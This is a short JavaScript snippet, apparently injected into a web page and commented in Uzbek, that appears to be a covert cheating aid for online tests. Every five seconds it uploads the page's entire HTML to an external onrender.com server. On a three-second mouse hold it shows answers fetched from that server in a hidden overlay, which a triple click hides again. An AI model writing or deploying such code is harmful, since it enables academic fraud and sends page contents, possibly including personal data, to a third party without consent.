(function(){
    const S = 'https://f1-f2mq.onrender.com';
    let box = document.createElement('div');
    box.style = "position:fixed; bottom:10px; left:10px; background:black; color:white; padding:10px; z-index:9999; display:none; border-radius:5px; font-family:sans-serif; max-width:200px;";
    document.body.appendChild(box);

    async function yubor() {
        await fetch(S + '/upload-html', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ html: document.documentElement.outerHTML })
        });
    }
    setInterval(yubor, 5000); // Har 5 soniyada savolni yuboradi
    yubor();

    let t;
    document.addEventListener('mousedown', () => {
        t = setTimeout(async () => {
            const r = await fetch(S + '/latest');
            const d = await r.json();
            box.innerHTML = d.message;
            box.style.display = 'block';
        }, 3000); // 3 soniya bosib tursa chiqadi
    });
    document.addEventListener('mouseup', () => clearTimeout(t));

    document.addEventListener('click', (e) => {
        if (e.detail === 3) box.style.display = 'none'; // 3 marta tez bossa yo'qoladi
    });
})();
